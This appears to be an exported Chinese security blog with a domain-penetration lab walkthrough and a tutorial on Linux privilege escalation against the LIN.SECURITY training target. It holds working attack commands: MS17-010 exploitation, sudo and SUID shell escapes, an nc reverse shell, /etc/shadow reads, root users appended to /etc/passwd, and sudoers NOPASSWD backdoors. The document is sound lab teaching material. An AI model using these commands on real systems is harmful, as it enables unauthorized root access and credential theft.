<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/ftp/ftp_version            <span class="comment">#发现内网ftp服务，基于默认21端口</span></span><br><span class="line">auxiliary/scanner/ssh/ssh_version            <span class="comment">#发现内网ssh服务，基于默认22端口</span></span><br><span class="line">auxiliary/scanner/telnet/telnet_version      <span class="comment">#发现内网telnet服务，基于默认23端口</span></span><br><span class="line">auxiliary/scanner/dns/dns_amp                <span class="comment">#发现dns服务，基于默认53端口</span></span><br><span class="line">auxiliary/scanner/http/http_version          <span class="comment">#发现内网http服务，基于默认80端口</span></span><br><span class="line">auxiliary/scanner/http/title                 <span class="comment">#探测内网http服务的标题</span></span><br><span class="line">auxiliary/scanner/smb/smb_version            <span class="comment">#发现内网smb服务，基于默认的445端口   </span></span><br><span class="line">auxiliary/scanner/mssql/mssql_schemadump     <span class="comment">#发现内网SQLServer服务,基于默认的1433端口</span></span><br><span class="line">auxiliary/scanner/oracle/oracle_hashdump     <span class="comment">#发现内网oracle服务,基于默认的1521端口 </span></span><br><span class="line">auxiliary/scanner/mysql/mysql_version        <span class="comment">#发现内网mysql服务，基于默认3306端口</span></span><br><span class="line">auxiliary/scanner/rdp/rdp_scanner            <span class="comment">#发现内网RDP服务，基于默认3389端口</span></span><br><span class="line">auxiliary/scanner/redis/redis_server         <span class="comment">#发现内网Redis服务，基于默认6379端口</span></span><br><span class="line">auxiliary/scanner/db2/db2_version            <span class="comment">#探测内网的db2服务，基于默认的50000端口</span></span><br><span class="line">auxiliary/scanner/netbios/nbname             <span class="comment">#探测内网主机的netbios名字</span></span><br></pre></td></tr></table></figure>

<p>查看主机开放的端口</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT <span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span> -p <span class="number">1</span><span class="number">-1000</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592140166321.png" alt="1592140166321"></p>
<p>开放了445端口，可以尝试使用ms17-010攻击。设置payload时要使用正向连接</p>
<blockquote>
<p>search ms17-010<br>use exploit/windows/smb/ms17_010_psexec<br>set payload windows/meterpreter/bind_tcp<br>set rhost 192.168.52.141<br>run</p>
</blockquote>
<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592140650820.png" alt="1592140650820"></p>
<h2 id="拿下域控"><a href="#拿下域控" class="headerlink" title="拿下域控"></a>拿下域控</h2><p>扫端口</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT <span class="number">192.168</span><span class="number">.52</span><span class="number">.138</span> -p <span class="number">1</span><span class="number">-500</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Vulnstack%E4%B8%80/1592143477464.png" alt="1592143477464"></p>
<p>开放445，再尝试用永恒之蓝打一下</p>
<blockquote>
<p>search ms17-010<br>use exploit/windows/smb/ms17_010_psexec<br>set payload windows/meterpreter/bind_tcp<br>set rhost 192.168.52.138<br>run</p>
</blockquote>
<p>但是并没有返回会话，但是 由于前面拿到了管理员账号和密码，所以直接使用<code>exploit/windows/smb/psexec</code>进行远程登陆(失败)</p>
<p>参考文章：<a href="https://www.liuk3r.com/index.php/2020/05/13/%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f%e9%9d%b6%e6%9c%ba-vulnstack-1/" target="_blank" rel="noopener">https://www.liuk3r.com/index.php/2020/05/13/%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f%e9%9d%b6%e6%9c%ba-vulnstack-1/</a></p>
<p><a href="https://www.cnblogs.com/wkzb/p/12358076.html#autoid-4-2-0" target="_blank" rel="noopener">https://www.cnblogs.com/wkzb/p/12358076.html#autoid-4-2-0</a></p>
<p><a href="https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/</a></p>
]]></content>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>通过LIN.SECURITY靶机学习linux提权</title>
    <url>/2020/06/23/linux-tiquan/</url>
    <content><![CDATA[<p><strong>通过  vulnhub-LIN.SECURITY靶机学习linux提权</strong></p>
<a id="more"></a>

<h1 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h1><p>靶机地址：<a href="https://www.vulnhub.com/entry/linsecurity-1,244/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/linsecurity-1,244/</a><br>靶机难度：中级（CTF）<br>靶机发布日期：2018年7月11日<br>靶机描述：在in.security，我们希望开发一个Linux虚拟机，该虚拟机在编写本文时基于最新的Ubuntu发行版（18.04 LTS），但存在许多漏洞，这些漏洞使用户无法升级扎根在盒子上。旨在帮助理解某些内置应用程序和服务（如果配置错误）可能会被攻击者滥用。<br>我们已将该框配置为模拟真实世界的漏洞（尽管位于单个主机上），这将帮助您完善本地特权升级技能，技术和工具集。从简单到中级都有许多挑战，我们很高兴看到您用来解决这些挑战的方法！<br>该图像不到1.7 GB，可以使用上面的链接下载。打开OVA文件时，将导入并使用NAT适配器配置名为lin.security的VM，但是可以通过首选虚拟化平台的首选项将其更改为桥接。<br>首先，您可以使用以下凭据登录主机：bob / secret<br>目标：得到root权限</p>
<h1 id="网络配置-无法获取ip"><a href="#网络配置-无法获取ip" class="headerlink" title="网络配置(无法获取ip)"></a>网络配置(无法获取ip)</h1><h2 id="第一种情况："><a href="#第一种情况：" class="headerlink" title="第一种情况："></a><strong>第一种情况：</strong></h2><p> <strong>通过netplan设置网络。</strong></p>
<p><strong>1.1</strong>在开机时按下Shift键进入以下界面<br><img src="/2020/06/23/linux-tiquan/20191207105956849.png" alt="在这里插入图片描述"><br><strong>1.2</strong>在此页面按下e键，进入如下界面<br><img src="/2020/06/23/linux-tiquan/20191207110056422.png" alt="在这里插入图片描述"><br><strong>1.3</strong>将ro 替换为 rw signie init=/bin/bash<br><img src="/2020/06/23/linux-tiquan/20191207110225780.png" alt="在这里插入图片描述"><br><strong>1.4</strong>按下Ctrl键+X键，进入如下页面<br><img src="/2020/06/23/linux-tiquan/20191207110341303.png" alt="在这里插入图片描述"><br><strong>1.5</strong>查看当前网卡IP信息 ip a</p>
<p><img src="/2020/06/23/linux-tiquan/1592824440957.png" alt="1592824440957"></p>
<p>1.6ifconfig -a看到有一块ens33的网卡，但是没有生效。  </p>
<p>sudo vim /etc/netplan/50-cloud-init.yaml<br>将enp0s3改为ens33<br>sudo netplan apply重启网络</p>
<p><img src="/2020/06/23/linux-tiquan/1592824900489.png" alt="1592824900489"></p>
<p>重启便能获得ip</p>
<p><img src="/2020/06/23/linux-tiquan/1592829008539.png" alt="1592829008539"></p>
<h2 id="第二种情况："><a href="#第二种情况：" class="headerlink" title="第二种情况："></a><strong>第二种情况：</strong></h2><p><strong>通过network设置网络</strong></p>
<p>参考文章：<a href="https://blog.csdn.net/Eastmount/article/details/106066009" target="_blank" rel="noopener">https://blog.csdn.net/Eastmount/article/details/106066009</a></p>
<p>到开机页面选择第二个Ubuntu的高级选项，如果启动网络正常的话可以直接开机，如果网络不正常可以按下面步骤操作。进入高级选项，再次选择第二个Linux内核版本的恢复模式回车。<br><img src="/2020/06/23/linux-tiquan/1590843558640.png" alt="1590843558640"></p>
<p>回车后会弹出选择界面，选择root一行回车，接着再次回车进入命令行模式。</p>
<p><img src="/2020/06/23/linux-tiquan/1590843569852.png" alt="1590843569852"></p>
<p>输入<code>&quot;mount -o rw,remount / &quot;</code>命令，再配置网络问卷，否则后面可能无法保存网络配置文件，这个命令让我们的 / 路径文件系统的可读模式能自由修改。接着输入命令查看网卡。</p>
<blockquote>
<p>mount -o rw,remount /<br>ifconfig -a</p>
</blockquote>
<p><img src="/2020/06/23/linux-tiquan/1590843612115.png" alt="1590843612115"></p>
<p>这里是ens33，然后继续输入命令修改网络配置文件。输入I修改模式，如下图所示。</p>
<blockquote>
<p>vi /etc/network/interfaces</p>
</blockquote>
<p>修改这两个地方，改成你的网卡名称(ens33)，然后输入“:wq”保存。<br><img src="/2020/06/23/linux-tiquan/1590843639246.png" alt="1590843639246"></p>
<p>最后输入reboot重启即可。</p>
<p>这里使用第一种方法获取ip为192.168.211.161<br>开放的端口为<br><img src="/2020/06/23/linux-tiquan/1592829939705.png" alt="1592829939705"></p>
<p>由于这里主要是学习提权，所以直接使用官方给出的bob/secret账号通过ssh连接</p>
<p><img src="/2020/06/23/linux-tiquan/1592830225020.png" alt="1592830225020"></p>
<h1 id="提权辅助工具"><a href="#提权辅助工具" class="headerlink" title="提权辅助工具"></a>提权辅助工具</h1><h2 id="LinEnum"><a href="#LinEnum" class="headerlink" title="LinEnum"></a>LinEnum</h2><p>这是一个非常基本的shell脚本，它执行65次以上的检查，从内核信息到定位可能的升级点（包括可能有用的SUID / GUID文件以及Sudo / rhost错误配置等等），都可以得到任何信息</p>
<p>常⽤命令：<code>./LinEnum.sh -r report -e /tmp/ -t</code> ⽣成的结果将导出到 /tmp/report ⽂件。直接执行也会在当前目录下生成report-12-06-20文件。</p>
<blockquote>
<ul>
<li>-k输入关键字</li>
<li>-e输入导出位置</li>
<li>-t包括全面（冗长）的测试</li>
<li>-s提供当前用户密码以检查sudo perms（不安全）</li>
<li>-r输入报告名称</li>
<li>-h显示此帮助文本</li>
</ul>
</blockquote>
<p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">工具下载地址</a><br><a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" target="_blank" rel="noopener">地址二</a></p>
<p><img src="/2020/06/23/linux-tiquan/1591968965598.png" alt="1591968965598"></p>
<p><img src="/2020/06/23/linux-tiquan/1591969365844.png" alt="1591969365844"></p>
<h2 id="LinuxSmartEnumeration"><a href="#LinuxSmartEnumeration" class="headerlink" title="LinuxSmartEnumeration"></a>LinuxSmartEnumeration</h2><p>该Shell脚本将显示有关本地Linux系统安全性的相关信息。<br>它还可以<strong>监视进程以发现循环程序执行</strong>。在执行所有其他测试时进行监视，因此可以节省一些时间。默认情况下，它会在1分钟内进行监控，可以通过<code>-p</code>参数选择观看时间。</p>
<p>它具有3种详细程度，因此您可以控制看到的信息量。</p>
<p>在默认级别，可以看到系统中非常重要的安全漏洞。级别<code>1</code>（<code>./lse.sh -l1</code>）显示了有助于您获得特权的有趣信息。级别<code>2</code>（<code>./lse.sh -l2</code>）只会转储它收集的有关系统的所有信息。</p>
<p>默认情况下，它将询问您一些问题：主要是当前的用户密码（如果知道的话；），以便可以进行一些其他测试。</p>
<p><a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank" rel="noopener">下载 地址</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">wget <span class="string">"https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh"</span> -O lse.sh;chmod <span class="number">700</span> lse.sh</span><br><span class="line"></span><br><span class="line">curl <span class="string">"https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh"</span> -Lo lse.sh;chmod <span class="number">700</span> lse.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1591969875484.png" alt="1591969875484"></p>
<p>First you should execute it just like ./lse.sh. If you see some green yes!, you probably have already some good stuff to work with.</p>
<h2 id="BeRootProject"><a href="#BeRootProject" class="headerlink" title="BeRootProject"></a>BeRootProject</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python beroot<span class="selector-class">.py</span> --password super_strong_password</span><br></pre></td></tr></table></figure>

<p>这个⼯具包含了GTFOBins所提到的⽂件列表，也就是说，可以检查出⼀些通过sudo运⾏即可提权 的⽂件。</p>
<p><a href="https://github.com/AlessandroZ/BeRoot" target="_blank" rel="noopener">下载地址</a></p>
<h1 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h1><h2 id="关于sudo"><a href="#关于sudo" class="headerlink" title="关于sudo"></a>关于sudo</h2><p>sudo是给普通用户某个命令有root权限，并不需要给root密码，普遍的做法就是利用sudo （Substitute User and Do 的简写）给其临时授权,临时让其以root 权限运行某个程序。</p>
<h2 id="sudo的执行原理"><a href="#sudo的执行原理" class="headerlink" title="sudo的执行原理"></a>sudo的执行原理</h2><p>普通用户执行命令 -&gt; 检查<code>/var/db/sudo/</code>目录下是否有用户时间戳 -&gt; 检查<code>/etc/sudoers</code>配置文件，用户是否有sudo权限 -&gt; 执行sudo命令并反回结果 -&gt; 退出sudo返回普通用户shell环境。<br>其中步骤2检查：时间戳默认从上一次执行sudo命令5分钟后过期。</p>
<p>要利用sudo提权，需要配置<code>/etc/sudoers</code> 或者使用<code>visudo</code>命令进行编辑。</p>
<p>文件语法：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">root <span class="keyword">ALL</span>=(<span class="keyword">ALL</span>) <span class="keyword">ALL</span></span><br></pre></td></tr></table></figure>

<ul>
<li>root表示用户名</li>
<li>第一个 ALL 指示允许从任何终端、机器访问sudo</li>
<li>第二个 (ALL)指示sudo命令被允许以任何用户身份执行</li>
<li>第三个 ALL 表示所有命令都可以作为root执行</li>
</ul>
<h2 id="提权演示"><a href="#提权演示" class="headerlink" title="提权演示"></a>提权演示</h2><ol>
<li>sudo -l ：查看当前⽤⼾sudo⽀持的命令</li>
</ol>
<p><img src="/2020/06/23/linux-tiquan/1592832167027.png" alt="1592832167027"></p>
<p>  在线查询sudo的提权命令：<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p>
<p>通过ash提权</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sudo ash</span><br></pre></td></tr></table></figure>

<p>通过awk提权</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sudo awk <span class="string">'BEGIN &#123;system("/bin/sh")&#125;'</span></span><br></pre></td></tr></table></figure>

<p>通过find提权</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sudo find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure>

<p>还有很多命令可以通过查上面的手册<br><img src="/2020/06/23/linux-tiquan/1592833753662.png" alt="1592833753662"></p>
<p><img src="/2020/06/23/linux-tiquan/1592833818823.png" alt="1592833818823"></p>
<p><img src="/2020/06/23/linux-tiquan/1592833852803.png" alt="1592833852803"></p>
<h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><h2 id="什么是suid"><a href="#什么是suid" class="headerlink" title="什么是suid"></a>什么是suid</h2><p>SUID是uid +s的组合，s指的是特殊权限。一般情况下，用户的权限是3位，比如0755这样的，特殊权限默认没有配置，但是如果超级管理员希望用户在执行一些特殊权限文件时，拥有root的权限，就会配置特殊权限。  </p>
<p>例如passwd这个命令，这个命令会修改/etc/shadow文件，而/etc/shadow只有root才能修改，本来passwd这个命令应该也只能root才能执行。但是系统为了让普通用户能够修改自己的密码，对passwd这个命令赋予了特殊权限并添加了只能修改自己密码的限制。</p>
<p><img src="/2020/06/23/linux-tiquan/1592880197935.png" alt="1592880197935">  </p>
<h2 id="suid提权原理"><a href="#suid提权原理" class="headerlink" title="suid提权原理"></a>suid提权原理</h2><p>SUID代表“执⾏时设置⽤⼾ID”，具有该标志位的⽂件在执⾏时，运 ⾏的uid变为属主⾝份，也就是说，如果⼀个程序属主是root，并具有suid标志位，其他⽤⼾运⾏时uid会临时变为root。 </p>
<h2 id="提权演示-1"><a href="#提权演示-1" class="headerlink" title="提权演示"></a>提权演示</h2><p><strong>常⻅的⽤于SUID提权的程序：</strong></p>
<ol>
<li><p>Nmap：较旧版本的Nmap（2.02⾄5.21）带有交互模式，从⽽允许⽤⼾执⾏shell命令。</p>
<blockquote>
<p> <code>nmap --interactive ， nmap&gt; !sh</code> 。 </p>
</blockquote>
</li>
<li><p>find： <code>touch test</code></p>
<blockquote>
<p><code>find test -exec whoami \</code>; </p>
<p><code>find test -exec bash -p \</code>; </p>
<p><code>find test -exec /bin/sh \</code>; （DC1就遇到bash⽆法提权，但是sh可以提权的情况） </p>
<p><code>find test -exec nc -e /bin/sh 192.168.139.128 9999 \</code>; </p>
</blockquote>
</li>
<li><p>vim： 直接编辑⽂件 vim /etc/shadow ，或者进⼊vim后启动sh交互。</p>
<blockquote>
<p><code>:set shell=/bin/sh</code></p>
<p><code>:shell</code></p>
<p>或者：<code>vim -c &#39;!sh&#39;</code></p>
</blockquote>
</li>
<li><p>bash： <code>bash -p</code></p>
</li>
<li><p>利⽤less执⾏命令</p>
<blockquote>
<p><code>less /etc/passwd</code></p>
<p><code>!/bin/sh</code> （已经设置suid的sh）</p>
<p>（more也 可以） </p>
</blockquote>
</li>
</ol>
<p>更多请参考：<a href="https://gtfobins.github.io/#+suid" target="_blank" rel="noopener">https://gtfobins.github.io/#+suid</a></p>
<p><strong>查看具有 suid权限的命令</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find / -user root -perm <span class="number">-4000</span> -<span class="keyword">print</span> <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br><span class="line">find / -user root -perm <span class="number">-4000</span> -exec ls -ldb &#123;&#125; \;</span><br><span class="line">find / -perm <span class="number">-4000</span> -type f -exec ls -la &#123;&#125; <span class="number">2</span>&gt;/dev/<span class="keyword">null</span> \;</span><br><span class="line">find / -uid <span class="number">0</span> -perm <span class="number">-4000</span> -type f <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592881118095.png" alt="1592881118095"></p>
<p>env和xxd等都可以使用suid提权<br><strong>env：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sudo sh -c <span class="string">'cp $(which env) .; chmod +s ./env'</span></span><br><span class="line"></span><br><span class="line">./env /bin/sh -p</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592881595036.png" alt="1592881595036"></p>
<p><strong>xxd：</strong></p>
<p>xxd的作用是将一个文件以16进制的形式显示出来。他被配置了特殊权限，并且用户组为itservices是拥有执行权限x的。通过<code>cat /etc/group | grep itservices</code>命令得到susan属于这个用户组</p>
<p><img src="/2020/06/23/linux-tiquan/1592881960486.png" alt="1592881960486"></p>
<p>一旦suid和执行权限在一起就可能导致权限提升！</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sudo sh -c <span class="string">'cp $(which xxd) .; chmod +s ./xxd'</span></span><br><span class="line"></span><br><span class="line">LFILE=file_to_read</span><br><span class="line">./xxd <span class="string">"$LFILE"</span> | xxd -r</span><br></pre></td></tr></table></figure>

<p>可以用该命令来查看/etc/shadow</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">su susan</span><br><span class="line"></span><br><span class="line">LFILE=/etc/shadow</span><br><span class="line">xxd <span class="string">"$LFILE"</span> | xxd -r</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592882175074.png" alt="1592882175074"></p>
<h1 id="密码相关"><a href="#密码相关" class="headerlink" title="密码相关"></a>密码相关</h1><h2 id="收集密码相关信息"><a href="#收集密码相关信息" class="headerlink" title="收集密码相关信息"></a>收集密码相关信息</h2><p>1.查找包含密码得文件(关键字password)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">grep --color=auto -rnw <span class="string">'/'</span> -ie <span class="string">"PASSWORD"</span> --color=always <span class="number">2</span>&gt; /dev/<span class="keyword">null</span></span><br><span class="line">find . -type f -exec grep -i -I <span class="string">"PASSWORD"</span> &#123;&#125; /dev/<span class="keyword">null</span> \;</span><br></pre></td></tr></table></figure>

<p>2.查看过期的密码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pam_cracklib会保存过期的密码记录在 /etc/security/opasswd ⽂件中。</span><br></pre></td></tr></table></figure>

<p>3.查看用户最后编辑得文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find / -mmin <span class="number">-10</span> <span class="number">2</span>&gt;/dev/<span class="keyword">null</span> | grep -Ev <span class="string">"^/proc"</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#最近⼗分钟编辑的⽂件</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592662561046.png" alt="1592662561046"></p>
<p>4.查看内存中的密码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">strings /dev/mem -n10 | grep -i PASS</span><br></pre></td></tr></table></figure>

<p>5.查看敏感文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">locate password | more</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592662724337.png" alt="1592662724337"></p>
<h2 id="破解-etc-passwd哈希"><a href="#破解-etc-passwd哈希" class="headerlink" title="破解/etc/passwd哈希"></a>破解/etc/passwd哈希</h2><p>linux的用户密码哈希存储在/etc/shadow文件，普通用户能够查看到的则是/etc/passwd这个文件  在/etc/passwd中，比如：<code>root:x:0:0:root:/root:/bin/bash</code>。账户的第二列是密码哈希，如果该列为x则代表密码哈希存储在/etc/shadow文件上</p>
<h2 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h2><p>只有root用户权限能够查看  保存加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号:分为九个部分</p>
<ol>
<li>用户名</li>
<li>加密后的密码</li>
<li>上次修改密码的时间(从1970.1.1开始的总天数)</li>
<li>两次修改密码间隔的最少天数，如果为0，则没有限制</li>
<li>两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为9999则没有限制</li>
<li>提前多少天警告用户密码将过期</li>
<li>在密码过期之后多少天禁用此用户</li>
<li>用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用</li>
<li>保留</li>
</ol>
<p><img src="/2020/06/23/linux-tiquan/1592835598272.png" alt="1592835598272"></p>
<p>并且哈希加密的密码具有固定格式：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">$id$<span class="pgsql">salt$<span class="keyword">encrypted</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512</p>
</li>
<li><p>salt为盐值,系统随机生成</p>
</li>
<li><p>encrypted表示密码的hash值</p>
</li>
</ul>
<h1 id="利用可写入文件"><a href="#利用可写入文件" class="headerlink" title="利用可写入文件"></a>利用可写入文件</h1><h2 id="搜索可写入文件"><a href="#搜索可写入文件" class="headerlink" title="搜索可写入文件"></a>搜索可写入文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find / -writable ! -user \`whoami\` -type f ! -path <span class="string">"/proc/*"</span> ! -path <span class="string">"/sys/*"</span> -exec ls -al &#123;&#125; \; <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br><span class="line">find / -perm <span class="number">-2</span> -type f <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br><span class="line">find / ! -path <span class="string">"*/proc/*"</span> -perm <span class="number">-2</span> -type f -<span class="keyword">print</span> <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>



<h2 id="etc-passwd-文件写入"><a href="#etc-passwd-文件写入" class="headerlink" title="/etc/passwd 文件写入"></a>/etc/passwd 文件写入</h2><p><strong>/etc/passwd</strong></p>
<p>普通用户权限能够查看  保存用户信息，每一行代表一个用户，每一行通过冒号:分为七个部分  </p>
<ol>
<li>用户名 </li>
<li>密码，x表示密码保存在/etc/shadow </li>
<li>UID，0代表root </li>
<li>GID，表示所在组 </li>
<li>描述信息，依次为Full Name、Room Number、Work Phone、Home Phone和Other </li>
<li>用户主目录 </li>
<li>默认shell类型</li>
</ol>
<p><img src="/2020/06/23/linux-tiquan/1592834918819.png" alt="1592834918819"></p>
<p>当我们对/etc/passwd文件具有写入权限时，可以尝试在/etc/passwd文件下添加新的用户使这个用户具有root权限</p>
<p><strong>生成密码字符串的三种方式：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">openssl passwd <span class="number">-1</span> -salt 盐值 密码</span><br><span class="line">mkpasswd -m SHA<span class="number">-512</span> 密码</span><br><span class="line">python2 -c <span class="string">'import crypt; print crypt.crypt("密码", "$6$salt")'</span></span><br></pre></td></tr></table></figure>

<p>kali使用openssl工具先创建一个本地的加密用户：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">openssl passwd <span class="number">-1</span> -salt admin <span class="number">111111</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592836118929.png" alt="1592836118929"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#之后构造：</span></span><br><span class="line">admin123:$<span class="number">1</span>$admin$<span class="number">2</span>WRLhTGcIMgZ7OhwCpREK1:<span class="number">0</span>:<span class="number">0</span>::/root:/bin/bash</span><br><span class="line"><span class="comment">#将其写入/etc/passwd</span></span><br><span class="line"><span class="comment">#通过su admin123  密码 111111切换用户即可获得root权限</span></span><br></pre></td></tr></table></figure>

<p><strong>不生成密码的方式：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'dummy::0:0::/root:/bin/bash'</span> &gt;&gt;/etc/passwd</span><br><span class="line">su - dummy</span><br></pre></td></tr></table></figure>

<h2 id="etc-sudoers文件写入"><a href="#etc-sudoers文件写入" class="headerlink" title="/etc/sudoers文件写入"></a>/etc/sudoers文件写入</h2><p>当使用sudo命令需要密码并且在不知道密码的情况下，如果该用户对/etc/sudoers文件具有写入权限，则可以通过写/etc/sudoers文件来使得我们不需要密码便能使用sudo命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"用户名 ALL=(ALL:ALL) ALL"</span>&gt;&gt;/etc/sudoers</span><br><span class="line"><span class="comment"># use SUDO without password</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"用户名 ALL=(ALL) NOPASSWD: ALL"</span> &gt;&gt;/etc/sudoers</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"用户名 ALL=NOPASSWD: /bin/bash"</span> &gt;&gt;/etc/sudoers</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592840613216.png" alt="1592840613216"></p>
<p><img src="/2020/06/23/linux-tiquan/1592840705377.png" alt="1592840705377"></p>
<h2 id="提权演示-2"><a href="#提权演示-2" class="headerlink" title="提权演示"></a>提权演示</h2><p><strong>破解哈希值：</strong></p>
<p>先查看/etc/passwd文件</p>
<p><img src="/2020/06/23/linux-tiquan/1592836209506.png" alt="1592836209506"></p>
<p>得到insecurity用户的md5值，使用在线破解得到<code>P@ssw0rd!</code>登录即可得到root权限</p>
<p><img src="/2020/06/23/linux-tiquan/1592836496817.png" alt="1592836496817"></p>
<p>破解用户密码hash的常用工具和方法 </p>
<ul>
<li><p>在线网站查询 </p>
<p><a href="https://cmd5.com" target="_blank" rel="noopener">https://cmd5.com</a> </p>
<p><a href="https://www.somd5.com/" target="_blank" rel="noopener">https://www.somd5.com/</a>  </p>
</li>
<li><p>工具 </p>
<p>John the Ripper 和 hashcat  </p>
<p>Kali2.0集成了John the Ripper和hashcat  </p>
<p><a href="https://klionsec.github.io/2017/04/26/use-john/" target="_blank" rel="noopener">https://klionsec.github.io/2017/04/26/use-john/</a>  </p>
<p><a href="https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/" target="_blank" rel="noopener">https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/</a>  </p>
<p>mimipenguin  </p>
<p><a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">https://github.com/huntergregal/mimipenguin</a>  </p>
<p>原理类似于mimikatz，通过内存导出明文密码</p>
<p><strong>写入用户和密码：</strong></p>
<p>参考下面几个靶机的提权</p>
<ol>
<li>对/etc/passwd文件具有写入权限：<a href="http://cyzcc.vip/2020/03/20/AI-Web1/">http://cyzcc.vip/2020/03/20/AI-Web1/</a></li>
<li>teehee具有root权限，通过teehee写入：<a href="http://cyzcc.vip/2020/03/07/vulnhub-DC9/">http://cyzcc.vip/2020/03/07/vulnhub-DC9/</a></li>
<li>wget具有root权限，通过wget写入：<a href="http://cyzcc.vip/2020/06/06/Os-hackNos-1/">http://cyzcc.vip/2020/06/06/Os-hackNos-1/</a></li>
</ol>
<p>。。。。。。</p>
</li>
</ul>
<h1 id="利用隐藏文件"><a href="#利用隐藏文件" class="headerlink" title="利用隐藏文件"></a>利用隐藏文件</h1><p>有时候隐藏文件会存放一些重要的信息，比如搜索home目录下的所有隐藏文件，并用ls -al显示出来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find / -name <span class="string">".*"</span> -type f -path <span class="string">"/home/*"</span> -exec ls -al &#123;&#125; \; <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/23/linux-tiquan/1592879116735.png" alt="1592879116735"></p>
<p>再倒数第二个文件发现可疑点，查看发现是susan的密码<br><img src="/2020/06/23/linux-tiquan/1592879290449.png" alt="1592879290449"></p>
<h1 id="NFS低权限访问"><a href="#NFS低权限访问" class="headerlink" title="NFS低权限访问"></a>NFS低权限访问</h1><h2 id="NFS简介"><a href="#NFS简介" class="headerlink" title="NFS简介"></a>NFS简介</h2><p>NFS(Network File System)即网络文件系统，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。</p>
